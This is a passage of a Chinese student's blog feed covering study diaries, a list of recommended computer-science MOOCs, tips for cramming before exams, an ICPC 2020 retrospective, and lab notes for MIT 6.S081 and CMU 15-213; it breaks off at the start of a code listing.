Wang, X., Dong, J. S., &amp; Dai, T. (2020). White-box fairness testing through adversarial sampling. Proceedings - International Conference on Software Engineering, 949–960. <a href="https://doi.org/10.1145/3377811.3380331">https://doi.org/10.1145/3377811.3380331</a></p><p>[2] Galhotra, S., Brun, Y., &amp; Meliou, A. (2017). Fairness testing: Testing software for discrimination. Proceedings of the ACM SIGSOFT Symposium on the Foundations of Software Engineering, Part F1301, 498–510. <a href="https://doi.org/10.1145/3106237.3106277">https://doi.org/10.1145/3106237.3106277</a></p><p>感觉把 <a href="https://blog.csdn.net/qq_33935895/article/details/106023540">这个 CSDN 博客</a> 的相关文章都读一遍就几乎成为大师了… <a href="https://blog.csdn.net/qq_33935895">主页</a> 这个人是同方向的。但还是要多读关于验证的啊，学点数学用得多一点的？之前读的关于 ML 测试经典论文的引用都非常高，而这两篇 [1] 是 2020 新论文， [2] 有 140，应该是点子新、贴近工业，非常适合于应用吧，有空读一读引这些文章的文章都是啥。</p><p>晚上又水了好久，最后用了 2h 复习上午背的+背了 GRE List 13。</p><h2 id="2021-2-13"><a href="#2021-2-13" class="headerlink" title="2021.2.13"></a>2021.2.13</h2><p>前两天是除夕、春节。效率不太高，但今天可能稍微进入一些状态了… 打算先尽快刷一遍单词。</p><p>当前进度：微臣 2018 全程班 day 2 / day 8, 即将背 List 21。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;寒假即将过半，坤神在爆碾 CMU Theoretical Computer Science 课程，陈少在进行大脑升级，而我却在 n 刷《进击的巨人》不能自拔… 我们都有光明的前途？&lt;/p&gt;
&lt;p&gt;我还可以抢救一下，不能再爬了！&lt;/p&gt;</summary>
    
    
    
    <category term="日记" scheme="http://yangdong2002.github.io/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>MOOC 推荐</title>
    <link href="http://yangdong2002.github.io/2021/02/05/MOOC-%E6%8E%A8%E8%8D%90/"/>
    <id>http://yangdong2002.github.io/2021/02/05/MOOC-%E6%8E%A8%E8%8D%90/</id>
    <published>2021-02-04T18:08:25.000Z</published>
    <updated>2021-07-03T15:04:04.896Z</updated>
    
    <content type="html"><![CDATA[<p>智慧大学上课也就图一乐，真正学知识还是要看国外四大名校课程。</p><span id="more"></span><h2 id="看过及正在看的："><a href="#看过及正在看的：" class="headerlink" title="看过及正在看的："></a>看过及正在看的：</h2><table><thead><tr><th>Name</th><th>Resources</th><th>Fin</th></tr></thead><tbody><tr><td><a href="http://csapp.cs.cmu.edu/3e/labs.html">CMU 15-213 Introduction to Computer Systems</a> 15 Fall</td><td><a href="https://scs.hosted.panopto.com/Panopto/Pages/Sessions/List.aspx#folderID=%22b96d90ae-9871-4fae-91e2-b1627b43e25e%22">video</a>, lab</td><td>✅</td></tr><tr><td><a href="https://pdos.csail.mit.edu/6.828/2020/schedule.html">MIT 6.S081 Operating System Engineering</a> 20 Fall</td><td><em>video</em>, lab, <a href="https://zhuanlan.zhihu.com/p/251366985">study group</a></td><td>✅</td></tr><tr><td><a href="https://cs144.github.io/">Stanford CS144 Introduction to Computer Networking</a> 20 Fall</td><td><a href="https://www.bilibili.com/video/BV137411Z7LR?from=search&seid=1507021317234250020">video’16</a>, lab</td><td>✅</td></tr><tr><td><a href="http://speech.ee.ntu.edu.tw/~tlkagk/courses_ML20.html">NTU Machine Learning</a> 20 Spring</td><td>video, slides, lab</td><td></td></tr><tr><td><a href="https://www.anilada.com/courses/15251f15/www/schedule.html">CMU 15-251 Great Ideas in Theoretical Computer Science</a> 15 Fall</td><td>slides <em><a href="https://www.youtube.com/watch?v=khyrgbiz20o&list=PLm3J0oaFux3aafQm568blS9blxtA_EWQv">video-</a></em> <a href="greatideas.zip">homework</a></td><td>✅</td></tr><tr><td><a href="https://cmu-program-analysis.github.io/2021/#schedule">CMU 17-355 Program Analysis</a> 21 Spring</td><td>text, slides, hw, lab</td><td>✅</td></tr><tr><td><a href="https://github.com/6035/sp21">MIT 6.035 Computer Language Engineering</a> 21 Spring</td><td>slides, lab</td><td>..</td></tr><tr><td><a href="https://safari.ethz.ch/digitaltechnik/spring2021/doku.php?id=homeworks">ETHz Digital Design and Computer Architecture</a> 21 Spring</td><td>video, slides, hw, lab</td><td>..</td></tr><tr><td>THU Compiler Project 2020 (<a href="https://decaf-lang.github.io/minidecaf-tutorial/">MiniDecaf</a>)</td><td>lab (<a href="https://github.com/YangDong2002/mydecaf">my code</a>)</td><td>✅</td></tr><tr><td>Stanford CS224n 2021 Spring</td><td>lab</td><td>✅07/02/2021</td></tr></tbody></table><p>注1：<code>video&#39;15</code> 表示 2015 年的视频，<code>video-</code> 表示视频不全，斜体表示我的完成率低于 50%。</p><p>注2：未加链接的资源均可在左边慕课首页上获得，未明显表明年份的资源就是与左侧学期配套的资源。</p><p>注3：打对勾的仅表示大致完成，且之后很可能不会再看的课，并不表示完成了所有内容！没有视频的课程有些课件自己啃效率不太高，就没仔细读 qwq。</p><h2 id="打算看的："><a href="#打算看的：" class="headerlink" title="打算看的："></a>打算看的：</h2><table><thead><tr><th>MOOC</th><th>资源</th></tr></thead><tbody><tr><td><a href="http://web.stanford.edu/class/cs143/">Stanford CS143 Compilers</a></td><td>B 站视频 + 远古 lab</td></tr><tr><td>The Fuzzing Book</td><td></td></tr><tr><td><a href="https://www.diderot.one/courses/28">CMU 15751 TCS Toolkit</a> Spring 2019</td><td><strong>全套</strong>资源</td></tr></tbody></table><h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><p>2021.3.15 感觉许多课程看 slides 就够了啊，比看视频要快…</p><p>2021.3.18 Mark <a href="https://sites.google.com/view/vnn20/home?authuser=0">VNN-COMP’20</a>, </p><p><a href="https://xiongyingfei.github.io/SA/2020/main.htm">https://xiongyingfei.github.io/SA/2020/main.htm</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;智慧大学上课也就图一乐，真正学知识还是要看国外四大名校课程。&lt;/p&gt;</summary>
    
    
    
    <category term="公开课" scheme="http://yangdong2002.github.io/categories/%E5%85%AC%E5%BC%80%E8%AF%BE/"/>
    
    
  </entry>
  
  <entry>
    <title>如何成为期末复习混子</title>
    <link href="http://yangdong2002.github.io/2021/02/05/%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E6%B7%B7%E5%AD%90/"/>
    <id>http://yangdong2002.github.io/2021/02/05/%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E6%B7%B7%E5%AD%90/</id>
    <published>2021-02-04T18:07:59.000Z</published>
    <updated>2021-02-09T15:55:38.566Z</updated>
    
    <content type="html"><![CDATA[<p>既然在西安智慧大学，能力提升和考试高分是不相关的，考前抱佛脚就成为标准配置了。这里浅谈如何高效抱佛脚，用最小精力混过无聊的考试。</p><span id="more"></span><ul><li>理性对待，不要神化难度与复习过程，也不要神化高分的作用。<strong>切勿浪费大量时间在期末考试上而减少对大脑升级活动的投入！</strong>平时只需要把作业题搞懂就行</li><li>期末考试不是什么高大上的东西，而只是对快速掌握简单知识能力的考察。</li><li>交大几乎所有科目都是很 trivial 的，且和提升能力是正交的。重要的课如果学校教得很差的话，最好学期内自己看国外视频做 lab 然后对着本校考纲微调。如果仅成为了本校考试的做题家，即使拿到高分也相当于没有学！</li><li>期末复习可以混，只要是沿着“通向期末高分的最短路”前进，就没问题。如果除了混高分，还想卷赢其他人，那么还需要注意不要有短板课（例如马原）。</li><li>如果是概念密集型课，课本太厚读不动的话，中国大学 MOOC 上可能会有类似的念经课转为应付期末而生，2倍速看念经课可以最短时间读完课本，快速断线重连。</li><li>复习最后一定要落实到做题上。</li></ul><p>eg1. OS 考试：暑假刷完了 CMU 15213 和 CSAPP、学期内学了大部分 MIT6.S081，然而应付考试实质上用处有限！考前 2 天听了某大学念经课、刷夜刷了考研题一本书和部分往年题，成为文科计算机大师，最终 99，最高分。</p><p>eg2. 计网考试：学期内刷了大部分 Stanford CS144，写了个 TCP，然而几乎和考试正交！这门课特点就是广而浅，就是考察做题过程中 one-shot learning 的能力！考前 4 天读了 800 页课件与 700 页课本，随便整了个 MOOC 做，还做了各种虚假的往年题，但没太做够题。考试时改错 4 分客观思博题，还好老师平时分抬了一手，最终 96，居然还是最高分。</p><p>eg3. 马原考试：考前 5 天开始每天抽 3h 背书，考前两天发现资料有点假，于是结合老师课件背书。做了些买的各种选择题感觉质量参差不齐。最后仔细做了武汉大学马原 MOOC 题感觉还可以。然后考试时选择题后面的几乎是武大 MOOC 的原题大战，太简单了！然后就赢了啊，最终 98，大概只用了 30h 就混到了全年级最高。</p><p>eg4. 数理方程：之前听说虽然上课不知道在讲啥，但是考试简单，于是考前 1.3 天才开始复习。0.6 天复习完基本原理，0.7 天做了/看了约 8 套往年题，结果期末考试居然几乎全是选择题，自然就 100 了。</p><p>eg5. 大学物理：虽说最后压轴文科题恰巧背过，但量子物理思博选择错了一个，某个光栅大题也思博了没写 0 级…最后就烂了。96，被 8% 的人吊打。</p><p>eg6. 概率论：发现课本太 trivial 了，考得也简单，于是只复习了 1.5 天。早就写完了，然后检查时思博改错了一个判断，最终 99，被 3% 的人吊打。</p><p>eg7. 电路：第一门复习的课，但当时不知道考试可以混效率很低。而临考前却热身不够没太做往年题，于是考试时就烂了，差点算不完，甚至有题大脑僵化了不会做。最终 97，被 17% 的人吊打。</p><p>eg8. 算法：傻逼课！！！考试周之前考的，大意了，没有对着垃圾课本微调。老师也是傻逼，净出文科题。ICPC 区域赛冠军拿不到算法课的 4.3？于是算法课就成为考得最差的文科课了，被 8% 的人吊打。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;既然在西安智慧大学，能力提升和考试高分是不相关的，考前抱佛脚就成为标准配置了。这里浅谈如何高效抱佛脚，用最小精力混过无聊的考试。&lt;/p&gt;</summary>
    
    
    
    <category term="文化课" scheme="http://yangdong2002.github.io/categories/%E6%96%87%E5%8C%96%E8%AF%BE/"/>
    
    
    <category term="内卷" scheme="http://yangdong2002.github.io/tags/%E5%86%85%E5%8D%B7/"/>
    
  </entry>
  
  <entry>
    <title>ICPC 2020</title>
    <link href="http://yangdong2002.github.io/2020/11/26/ICPC2020/"/>
    <id>http://yangdong2002.github.io/2020/11/26/ICPC2020/</id>
    <published>2020-11-26T04:19:44.000Z</published>
    <updated>2021-02-05T15:03:20.244Z</updated>
    
    <content type="html"><![CDATA[<p>国内基本上没有更高的 ICPC 成就可以拿了！？</p><p>队友太牛逼了！</p><span id="more"></span><p>我已经成为精神退役选手了。</p><h2 id="生涯（几乎）结束"><a href="#生涯（几乎）结束" class="headerlink" title="生涯（几乎）结束"></a>生涯（几乎）结束</h2><blockquote><p> 向之所欣，俯仰之间，已为陈迹，犹不能不以之兴怀。</p></blockquote><p>第一次正式赛最后两分钟绝杀，第一次战胜赛前难以想象的强敌，第一次拿到区域赛冠军，第一次拿到 World Finals 门票… </p><p>ICPC 带给我的最大收获，正如伟大哲学家 nocriz 所说，就是让我认识到世界上很多“牛逼”的事情实际上还是可以做得到的吧。入坑之前的我认为 CF 红名、区域赛冠军、进 WF 都是不可能做到的，但是在队友的强力 carry 下，仍然是做到了。我们所认识的半数以上的牛逼人很可能也只是比我们提前努力了一定时间，他们的成就在我们前进足够的时间之后也是可以企及的。</p><p>再有就是，ICPC 教会了我<strong>什么是 trivial，什么是有意义</strong>。没错，这么显然的问题我直到大一才明白！预科的我，一方面由于没有好的指导，执着于机械地刷同济高数、线代；另一方面还受限于内卷思维，不知道自己将来应该学啥。我当时天天卷期末、卷文化课、卷物理竞赛，做一些 trivial 的事，却不知道大脑升级才是求学期间最重要的，没有抓住真正的升级机会。好在当时刚从初中升上来，足够勤奋，虽然效率低但是硬是用自律和学习时间达到了一定升级效果。现在知乎上无意刷到过什么如何获得高绩点、如何获得四六级高分这种问题，看到各种答主仿佛就看到了预科时的我：卷王、“考试带师”们在群魔乱舞，为自己在简单、trivial 考试上整个学期 996 而自我感动，仿佛自己做了什么了不起的事情一样（然后看起来他们考得还不如我这个混子高）。好在预科二时我接触了 ICPC ，终于知道了什么叫做“困难”、“有意义”、“实力至上”。终于，我开始以“大脑升级”为大学的第一准则，明辨“简单”和“困难”的区别，树立高标准，抵制虚假努力 。</p><p>下学期可能为了奖金还会打下 CCPC Final 和 EC Final，但是也不会再训练了。World Finals 还有一定吸引力，但是如果推迟到 22 年 3 月的话，实在是太遥远了！1 年之后，谁知道我会在干什么呢？</p><p>队友们对于退役，还是挺感伤的，后悔没成为高水平选手就结束了。队友 OI 历程有着难以弥补的遗憾，被少年班政策卡着去不了 NOI，进而无法逃离智慧大学，无法去更好的大学。但对我个人而言，由于之前不懂简单和困难的区别，初中没学过 OI，以及少年班预科一直在学大学简单数学课，我刚刚入坑 OI 就退役了，根本没看到过去往更好大学的希望，也就没有体会过那种痛苦了。我当时也是一种可悲啊！但是，这样的好处就是我几乎只遇到过正反馈，来的轻松，走的也轻松。我知道我再努力训练一年 ICPC 的上限也就是 nocriz 当前的水平，而同时我也发现了可能比 ICPC 更升级的东西，管窥了国外名校学生的学习是什么样的。如果把一年时间放在更升级的学习、科研上面，我获得更好 PhD offer 的概率会大大增加，于是个人也就觉得 ICPC 就是这么回事了，不值得再继续投入时间了。</p><p>ICPC 心愿单上 99% 的成就都已经达到了，我也可以光荣退役了吧（逃）</p><h2 id="赛季成就"><a href="#赛季成就" class="headerlink" title="赛季成就"></a>赛季成就</h2><p>2020.10.18 CCPC Qinhuangdao <strong>Runner up</strong></p><p>2020.10.25 CCPC Weihai <strong>4th Place</strong></p><p>2020.11.22 ICPC Xiaomi Invitational Contest 14th Place</p><p>2020.12.13 ICPC Shanghai Regional Contest <strong>Winner</strong> (To advance to <strong>World Finals 2021</strong>)</p><p>2020.12.20 ICPC Nanjing Regional Contest 20th Place</p><p><img src="shanghai.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;国内基本上没有更高的 ICPC 成就可以拿了！？&lt;/p&gt;
&lt;p&gt;队友太牛逼了！&lt;/p&gt;</summary>
    
    
    
    <category term="游记" scheme="http://yangdong2002.github.io/categories/%E6%B8%B8%E8%AE%B0/"/>
    
    
    <category term="ICPC" scheme="http://yangdong2002.github.io/tags/ICPC/"/>
    
  </entry>
  
  <entry>
    <title>Stanform CS144 Introduction to Computer Networking</title>
    <link href="http://yangdong2002.github.io/2020/09/20/Stanform-CS144-Introduction-to-Computer-Networking/"/>
    <id>http://yangdong2002.github.io/2020/09/20/Stanform-CS144-Introduction-to-Computer-Networking/</id>
    <published>2020-09-20T08:30:31.000Z</published>
    <updated>2020-09-19T17:30:32.069Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>MIT 6.S081 Operating Systems Engineering</title>
    <link href="http://yangdong2002.github.io/2020/09/20/MIT-6-828-Operating-Systems-Engineering/"/>
    <id>http://yangdong2002.github.io/2020/09/20/MIT-6-828-Operating-Systems-Engineering/</id>
    <published>2020-09-20T07:27:43.000Z</published>
    <updated>2020-10-07T10:48:11.879Z</updated>
    
    <content type="html"><![CDATA[<p>既然选择了文化课 Hard 模式，就从这一门 MIT 操作系统神课开始吧！</p><p>顺带一提，由于疫情，这门课 2020 Fall 的版本是完全开源的，课程视频、lab 作业都将是公开的，2020 Fall 打算刷这门课的同学可以和 MIT 学生同步学习。</p><p><a href="https://pdos.csail.mit.edu/6.828/2020/schedule.html">课程链接</a>  <a href="https://github.com/YangDong2002/MIT6.828">我的github仓库</a></p><span id="more"></span><h1 id="Progress"><a href="#Progress" class="headerlink" title="Progress"></a>Progress</h1><p>2020.9.21 Lab util (100/100), 5h</p><p>2020.9.21 Lab syscall (35/35), 2h</p><p>2020.10.4 Lab pgtbl (66/66), 14h</p><p>2020.10.4 Lab traps (85/85), 2h</p><p>2020.10.5 Lab lazy (90/90), 5h</p><h1 id="Labs"><a href="#Labs" class="headerlink" title="Labs"></a>Labs</h1><h2 id="Lab-util"><a href="#Lab-util" class="headerlink" title="Lab util"></a>Lab util</h2><p>第一个实验，目的是为了让大家熟悉 UNIX system call 的语义。</p><ul><li>prime 实验，居然还可以利用管道实现并发！对于 pipe 的理解加深了很多。</li><li>xargs 实验，原来 UNIX 还有这么好用的工具…</li></ul><h2 id="Lab-syscall"><a href="#Lab-syscall" class="headerlink" title="Lab syscall"></a>Lab syscall</h2><p>这个实验比较简单…但这其实是暴风雨前的黎明:) 本质是通过实验强制让我理解了 xv6 对应代码的原理。</p><ul><li>xv6 的 <code>kalloc</code> 每次分配一页，直接用了个空闲链表维护；</li><li>认识了 <code>copyin</code>，<code>copyout</code> 函数，嘿嘿，为下个实验做铺垫…</li></ul><h2 id="Lab-pgtbl"><a href="#Lab-pgtbl" class="headerlink" title="Lab pgtbl"></a>Lab pgtbl</h2><p>目前最牛逼的实验… 没有之一。我花了相当长的时间，也踩了无数个坑。后面有节课讲解 lab，一位 MIT 小哥给教授说因为一个不起眼的问题（xv6 中 kernel 模式无法访问标有 PTE_U 的 PTE）少睡了 4 小时… 我只想说，俺也一样！做完后回过头看可能没那么难，但是完成这个实验需要对页表机制有着充分的理解，并且要充分读懂 xv6 的代码。我到后来还出了同步问题，有概率通过所有样例也有概率 panic… 还好最后找到原因了。完成这个 lab </p><p>2020.10.4 Lab traps (85/85), 2h</p><p>2020.10.5 Lab lazy (90/90), 5h</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;既然选择了文化课 Hard 模式，就从这一门 MIT 操作系统神课开始吧！&lt;/p&gt;
&lt;p&gt;顺带一提，由于疫情，这门课 2020 Fall 的版本是完全开源的，课程视频、lab 作业都将是公开的，2020 Fall 打算刷这门课的同学可以和 MIT 学生同步学习。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2020/schedule.html&quot;&gt;课程链接&lt;/a&gt;  &lt;a href=&quot;https://github.com/YangDong2002/MIT6.828&quot;&gt;我的github仓库&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="公开课" scheme="http://yangdong2002.github.io/categories/%E5%85%AC%E5%BC%80%E8%AF%BE/"/>
    
    
    <category term="操作系统" scheme="http://yangdong2002.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>字节跳动夏令营 Byte Camp 2020 游记</title>
    <link href="http://yangdong2002.github.io/2020/09/10/%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8%E5%A4%8F%E4%BB%A4%E8%90%A5-Byte-Camp-2020-%E6%B8%B8%E8%AE%B0/"/>
    <id>http://yangdong2002.github.io/2020/09/10/%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8%E5%A4%8F%E4%BB%A4%E8%90%A5-Byte-Camp-2020-%E6%B8%B8%E8%AE%B0/</id>
    <published>2020-09-10T06:57:34.000Z</published>
    <updated>2021-02-05T15:05:49.947Z</updated>
    
    <content type="html"><![CDATA[<p>和优秀的人，做有意义的事</p><span id="more"></span><p>字节跳动夏令营于 8.30 - 9.5 在上海举行了。这是我第一次参加非 ICPC 相关的计算机夏令营，也是感触多多呢。同时营后我们也继续在上海待了几天来旅游，这真的是一段快乐而难忘的时光呢！</p><h1 id="Day-0"><a href="#Day-0" class="headerlink" title="Day 0"></a>Day 0</h1><p>7.13 看到字节跳动夏令营的宣传，抱着大学生活不应该仅限于 ICPC、未来可能学 AI 相关方向以及可以来免费旅游这三方面的想法，我报名了夏令营笔试。7.15 做了些填空选择，以及 4 道简单编程题就直接通过了，获得了项目选题的“最高优先级”。由于对选题也没什么想法，就选了个“推荐模型的蒸馏算法”一题，因为它的介绍十分清晰。</p><p>8.17 返校了，我开始准备字节营相关的知识，但是 ICPC 校队集训开始了，以及之后参加了 Petrozavodsk 营，没来得及太仔细看这个项目，只是读了 SOTA 论文。</p><p>8.28 Ptz 营结束之后，我才意识到了时间的紧迫，立即开始准备论文复现。我当时太天真，以为按论文思路写出代码就可以完成复现，可是好不容易把代码调通，原论文的超参数却根本不工作。这时才知道原论文代码可能有一些我没有写到的细节操作，以及预处理方式不一样。</p><p>就这样，我们就开始</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;和优秀的人，做有意义的事&lt;/p&gt;</summary>
    
    
    
    <category term="游记" scheme="http://yangdong2002.github.io/categories/%E6%B8%B8%E8%AE%B0/"/>
    
    
    <category term="AI" scheme="http://yangdong2002.github.io/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>Petrozavodsk Camp Summer 2020 游记</title>
    <link href="http://yangdong2002.github.io/2020/09/10/Petrozavodsk-Camp-Summer-2020-%E6%B8%B8%E8%AE%B0/"/>
    <id>http://yangdong2002.github.io/2020/09/10/Petrozavodsk-Camp-Summer-2020-%E6%B8%B8%E8%AE%B0/</id>
    <published>2020-09-10T06:55:07.000Z</published>
    <updated>2020-09-09T15:55:07.234Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>CMU 15-213 Introduction to Computer Systems</title>
    <link href="http://yangdong2002.github.io/2020/08/16/CMU-15-213-Introduction-to-Computer-Systems/"/>
    <id>http://yangdong2002.github.io/2020/08/16/CMU-15-213-Introduction-to-Computer-Systems/</id>
    <published>2020-08-15T22:55:44.000Z</published>
    <updated>2020-08-16T17:04:29.960Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.cs.cmu.edu/~213/index.html">CMU 15-213</a> 被誉为卡耐基梅隆大学计算机系的“神课”，教材是知名的 Computer Systems: A Programmer’s Perspective（CSAPP，中文译名《深入理解计算机系统》，但不知道“深入”是从哪里来的）。其课程号 15213 恰好也是 CMU 的邮政编码。</p><p>这门课相当于 x86-64 汇编语言、计算机组成原理、操作系统等课程的大杂烩，起到导论作用，是 CMU 计算机大二学生的必修课程。两周刷下来，我感觉这门课最核心的是有趣的实验作业（Lab）。这里我记录一下一些感受和收获。</p><span id="more"></span><h1 id="课程"><a href="#课程" class="headerlink" title="课程"></a>课程</h1><h2 id="1-2-3-章"><a href="#1-2-3-章" class="headerlink" title="1,2,3 章"></a>1,2,3 章</h2><p>第一章：综述性质，可以读一读。</p><p>第二章：除了浮点数原理，剩下的学过 OI 的基本都懂…我反正跳了，做 Data lab 时学就可以了。</p><p>第三章是很重要也很有收获的一章，5 节课 + 2 个 lab，可以看到其重要程度。主要是熟悉 C 语言转化来的 x86-64 汇编。</p><p>值得一提的首先是寄存器。常见寄存器的名字要知道，如 8 个通用目的寄存器（%rax, %rbx, %rcx, %rdx, %rsi, %rdi, %rbp, %rsp）、%rip 及用处，多看看汇编代码就能记住了。寄存器有 caller saved 和 callee saved 这两种，以及相关的概念。Callee saved 这个思想在异步信号安全中也出现了，还蛮重要。</p><p>第二就是条件传送（cmovq 之类的指令），完全打破了我之前的认知。条件传送可以更好地利用流水线，不用承担 if 跳转带来的分支预测错误的惩罚，可谓神器。C++ 的<code>std::max</code> 之类的开 O2 之后的汇编就是条件传送，比手写的快，丝毫不用担心这方面的常数。 Data lab 有一个 $O(1)$ 条指令实现条件的函数感觉可能就是条件传送的思想。</p><p>第三是 leaq 之类的指令。编译器用 leaq 进行了各种避免乘以常数的骚操作。</p><p>第四就是缓冲区溢出的风险了，做 Attack lab 后深有体会。</p><h2 id="5-6-章"><a href="#5-6-章" class="headerlink" title="5,6 章"></a>5,6 章</h2><p>第五章感觉学得也比较无感… 凭 ICPC 竞赛和之前某华为比赛卡常的经验，基本都挺熟悉了。</p><p>第六章讲存储器层次结构，阐释了书封面上的“存储器山”，介绍了时间、空间局部性的重要性。讲了高速缓存的原理，以及如何写 cache 友好的矩阵乘法、如何通过分块减少 cache miss 等。配套的 Cache lab 真是大毒瘤！</p><h2 id="7-8-9-章"><a href="#7-8-9-章" class="headerlink" title="7,8,9 章"></a>7,8,9 章</h2><p>第七章链接，挺重要、挺有趣的话题，不过就讲了一节课，也没有 lab… 讲了库打桩之类的高科技，但我感觉自己学得不太行，有时间再仔细读读书。</p><p>第八章异常控制流，看到了并发编程的冰山一角，感觉全程高能啊！引入了异常、进程、信号的概念，以及 Unix 的标准实现。需要注意信号是不会排队的。</p><p>很重要的一点就是信号处理函数要做到“异步信号安全”（async signal safety），以及注意同步问题。异步信号安全是个很强的条件（但是否完全强于线程安全呢？），指的是运行被中断，再次调用时仍然不会出错。例如 printf 就不是异步信号安全的，因为它有公用的缓冲区。可能有人会问给缓冲区加锁是不是就解决问题了？答案是否定的。考虑函数 A 调用了 printf，已经给缓冲区加上了锁；这时信号来了，printf 被中断，转而开始运行信号处理函数 B，如果 B 调用了 printf，B 会发现缓冲区已经上了锁，所以会挂起，等待锁解除；但是只有 B 运行完了，才会继续运行 A 的 printf，B 在等待一个不可能发生的事件，造成了死锁！课程还介绍到了要避免很多非常细微的竞争问题。如在 Shell lab 中，父进程在 fork 前就必须阻塞 SIGCHLD，以免在将子进程加入 jobs 的数据结构之前子进程结束，SIGCHLD 处理函数要从 jobs 数据结构中删除还未被加入的子进程。</p><p>非本地跳转，是带着上下文的。很多高级语言的 try… catch… 都是非本地跳转。</p><p>第九章虚拟内存，也是非常重要的概念，不过也没感觉多难… 从磁盘读的 miss penalty 特别大，所以用全相连的方式、通过软件和复杂的逻辑进行缓存。地址翻译感觉又是高速缓存的那一套… 感觉多级页表本质上就是 trie 树… 内存映射很有趣，将没有加载的文件以 page fault 的形式载入。fork 后的 copy on write 技术很有用。动态内存分配的话，得益于诸多 ICPC 大模拟的出题人，绝大多数概念都很熟悉了，做 malloc lab 也没感觉多难，甚至都没看课本上参考代码</p><h2 id="10-11-12-章"><a href="#10-11-12-章" class="headerlink" title="10,11,12 章"></a>10,11,12 章</h2><p>第十章内容挺少，但还算挺有用。Unix 一切皆文件，但是 Unix I/O 太低级了，不保证能按照要求读/写完。Robust I/O 包很有趣，是线程安全的，在 Proxy lab 很有用。文件描述符表、打开文件表、v-node 表的概念挺重要，这样来看，可以同时打开多个文件，fork 出的子进程的文件描述符表的继承也显得很自然，而重定向 dup2(oldfd, newfd) 函数也变得非常简单。感觉一个重点就是标准 I/O 并不是万能的，尤其在网络编程中不要用。</p><p>第十一章，网络编程。之前有用 Python Flask 的经验，而这回用 C 语言来网络编程，更能理解一些底层的东西。IP 协议提供了基本命名方法和（主机间）递送机制（datagram），但丢失重复时不会恢复；UDP 是进程间的不可靠数据报协议，稍稍拓展了 IP；TCP 也建立在 IP 之上，是进程间可靠的全双工连接。要同时能处理多个客户端的请求就需要并发编程了。</p><p>客户端： getaddrinfo -&gt; socket -&gt; connect -&gt; rio_writen / rio_readlineb -&gt; close</p><p>服务器：getaddrinfo -&gt; socket -&gt; bind -&gt; listen -&gt; accept -&gt; rio_readlineb / rio_writen -&gt; -&gt; close</p><p>第十二章，并发编程。有三种方式：基于进程、基于线程和基于 I/O 多路复用，效率逐渐增高，调度难度逐渐增大。主要讲了线程，不同线程有不同的线程 ID、栈空间、PC、条件码、通用目的寄存器等，而全局数据是共享的。共享变量很方便，但可能有同步错误，如 10 个线程都操作 10000 次，每次给开始是 0 的全局变量 cnt 递增 1，则 cnt 最终未必是 100000。</p><p>用信号量同步线程非常有趣，有两种操作：P 是如果变量非零，则将其减一后返回，否则阻塞；V 是将变量加一，如果之前有线程被阻塞，则唤醒其中任何一个。给上面提到的 cnt 加锁就很简单了，初始一个信号量 s 是 1，每个线程在 ++cnt 前调用 P(s)，而在之后调用 V(s)。从线程图的角度，如果是二维的，这就是禁止了一个矩形区域。用信号量可以解两个经典互斥访问问题：生产者-消费者问题（可用于预线程化）、读者写者问题（可以在多线程条件下维护数据结构）。</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>课上的实验都做了，以下是完成度表：</p><table><thead><tr><th>Lab name</th><th>Progress</th></tr></thead><tbody><tr><td>Data lab</td><td>100%</td></tr><tr><td>Bomb lab</td><td>100%</td></tr><tr><td>Attack lab</td><td>95%</td></tr><tr><td>Cache lab</td><td>91%</td></tr><tr><td>Shell lab</td><td>100%</td></tr><tr><td>Malloc lab</td><td>98%</td></tr><tr><td>Proxy lab</td><td>100%</td></tr></tbody></table><h2 id="Data-lab"><a href="#Data-lab" class="headerlink" title="Data lab"></a>Data lab</h2><p>第一次作业，非常有趣，感觉非常人类智慧啊！这里分享三个好题的解法，不一定是最优的。logicalNeg 貌似有 O(1) 次操作的方法…orz</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 